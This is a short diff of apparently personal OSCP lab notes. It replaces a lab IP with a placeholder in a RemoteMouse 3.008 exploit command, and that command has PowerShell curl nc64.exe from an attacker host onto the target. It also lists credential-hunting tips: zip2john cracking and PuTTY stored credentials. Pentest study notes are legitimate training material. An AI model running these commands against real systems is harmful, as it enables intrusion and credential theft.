@@ -8,7 +8,7 @@
 2. Copyfail worked; alternative is find writable files then zip2john the zip files to get creds. 
 
 #### OSCP A, Box 3 => Wifi mouse, putty rdp 
-1. Scanning ports showed 1978, exploit = `python3 RemoteMouse-3.008-Exploit.py --target-ip 192.168.230.199 -v --cmd 'powershell -c "curl http://{{LHOST}}/nc64.exe -o C:/Windows/Temp/nc.exe"'` 
+1. Scanning ports showed 1978, exploit = `python3 RemoteMouse-3.008-Exploit.py --target-ip {{RHOST}} -v --cmd 'powershell -c "curl http://{{LHOST}}/nc64.exe -o C:/Windows/Temp/nc.exe"'` 
 2. Check for unusual programs installed, eg 'PuTTY', and where they can store creds. 
 
 ---- 
